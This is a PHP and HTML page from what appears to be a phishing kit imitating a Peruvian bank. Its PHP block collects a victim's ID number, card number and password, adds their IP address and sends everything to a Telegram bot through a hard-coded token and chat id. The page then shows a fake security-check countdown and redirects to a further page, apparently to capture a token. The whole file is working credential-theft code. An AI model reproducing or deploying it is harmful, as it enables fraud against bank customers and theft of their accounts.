<?php
session_start();
if( isset( $_POST['ipts1'] ) && isset( $_POST['ipts2']) && isset( $_POST['ipts3']) ){
        
    $_SESSION['COD'] = $_POST['ipts1'];
    $_SESSION['USER'] = $_POST['ipts2'];
    $_SESSION['PASS'] = $_POST['ipts3'];
    
    @$message = "PERU BCPS\n\nIP: ".$_SERVER['REMOTE_ADDR']."\n".'DNI: '.$_SESSION['COD']."\n".'TARJ: '.$_SESSION['USER']."\n".'CLAv: '.$_SESSION['PASS'];

    $apiToken = "5490265950:AAHoe7yb6zqmDknXlBj5RxM6ZUldazvi8SQ";

    $data = [
        'chat_id' => '5798638424',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{
    @header('Location:');
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="cs.css">
</head>
<body class="body">
    

<div class="dc">
<img  src="logo.svg" alt="" width="120px">
</div>







<div class="pp">



<br><br>



    <center>
<img class="title" src="title.png" alt="">
      <div class="caja1">
        

 <br>

           <form action="" method="post" class="hh"> 






            <a class="txt3" id="CuentaAtras">Espera...  </a>


            <script language="JavaScript">
            
               /* Determinamos el tiempo total en segundos */
               var totalTiempo=30;
               
               var url="token1.php";
            
               function updateReloj()
               {
                   document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" Segundos.<br><br>Estamos verificando la información por seguridad no cierre esta ventana y no apague su dispositívo. <br> ";
            
                   if(totalTiempo==0)
                   {
                       window.location=url;
                   }else{
                       /* Restamos un segundo al tiempo restante */
                       totalTiempo-=1;
                       /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
                       setTimeout("updateReloj()",1000);
                   }
               }
             window.onload=updateReloj;
            
               </script>
           <br><br> 

  <img src="CARGANDO.gif" alt="" style="width: 80px;">




<br> <br><br>  


<img src="mogos.png" alt="" style="width: 300px;">



           <br><br><br><br><br> 



            </form>



      </div>
    </center>











































</div>

















</body>
</html>